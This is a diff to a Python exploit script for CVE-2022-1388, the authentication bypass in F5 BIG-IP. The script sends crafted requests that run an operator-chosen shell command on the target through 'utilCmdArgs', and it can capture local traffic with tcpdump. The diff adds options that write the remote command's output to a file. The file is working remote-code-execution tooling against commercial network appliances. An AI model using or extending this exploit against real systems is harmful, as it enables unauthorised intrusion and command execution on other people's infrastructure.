@@ -12,6 +12,8 @@ def init():
     parser.add_argument("-p", "--port", "--PORT",     help="Target port on vulnerable BIG-IP system")
     parser.add_argument("-c", "--cmd", "--command",    help="Command to run on target system")
     parser.add_argument("-e", "--export", "--tcpdump",    help="Save the captured traffic from the local machine as a pcap file.", action="store_true")
+    parser.add_argument("-f", "--file",    help="Set the output filename", default="output.txt")
+    parser.add_argument("-s", "--save",    help="Write down the output in the file", action="store_true")
     
     args = parser.parse_args()
     
@@ -19,6 +21,8 @@ def init():
     p = args.port
     c = args.cmd
     e = args.export
+    f = args.file
+    s = args.save
     
     if not p:
         # default: 443 (HTTPS)
@@ -48,7 +52,9 @@ def init():
             'command': 'run', 
             'utilCmdArgs': '-c "{}"'.format(c)
             }
-    return target, header, data
+    if not s:
+        f = None
+    return target, header, data, f
 
 def export_tcpdump(port, seconds=5):
     print("export tcpdump")
@@ -60,7 +66,7 @@ def export_tcpdump(port, seconds=5):
     # don't record anything to screen.
     subprocess.Popen(['tcpdump', '-nnp', '-G {}'.format(seconds), '-W 1', 'port {}'.format(port), '-Uwdetection.pcap'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-def CVE_2022_1388(target, header, data):
+def CVE_2022_1388(target, header, data, filename):
     try:
         # post the request
         res = requests.post(url=target, headers=header, json=data, proxies=None, timeout=15, verify=False)
@@ -68,6 +74,10 @@ def CVE_2022_1388(target, header, data):
             res.json()['commandResult']
             # output: result part
             print(res.json()['commandResult'])
+            if filename:
+                f = open(filename, 'w')
+                f.write(res.json()['commandResult'])
+                f.close()
         except:
             print(res)
 
@@ -75,5 +85,5 @@ def CVE_2022_1388(target, header, data):
         print("Error:", res)
 
 if __name__ == "__main__":
-    target, header, data = init()
-    CVE_2022_1388(target, header, data)
+    target, header, data, filename = init()
+    CVE_2022_1388(target, header, data, filename)
